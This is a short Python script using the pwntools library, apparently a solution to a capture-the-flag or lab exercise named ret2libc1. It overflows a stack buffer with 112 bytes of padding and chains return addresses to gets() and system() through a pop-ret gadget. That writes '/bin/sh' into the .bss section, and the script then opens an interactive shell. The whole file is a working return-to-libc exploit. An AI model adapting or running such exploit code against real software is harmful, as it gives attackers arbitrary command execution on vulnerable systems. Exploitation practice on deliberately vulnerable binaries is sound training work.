from pwn import *


def ret2_libc1_2(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2libc1'):
    print('call ret2libc1 start')
    try:
        io = process([file_name])

        elf = ELF(file_name)

        put_plt = elf.plt['gets']

        system_plt = elf.plt['system']

        bss_start = elf.bss()

        complete_bss = 0x0804A060

        pop_ret = 0x080486ef

        payload_1 = b'A' * 112
        payload_1 += p32(put_plt) + p32(pop_ret) + p32(complete_bss)
        payload_1 += p32(system_plt) + p32(pop_ret) + p32(complete_bss)

        io.sendline(payload_1)

        io.sendline('/bin/sh')

        io.interactive()

    except Exception:
        return False
    finally:
        print('call ret2libc1 end\n\n')

    return True


if __name__ == '__main__':
    ret2_libc1_2()
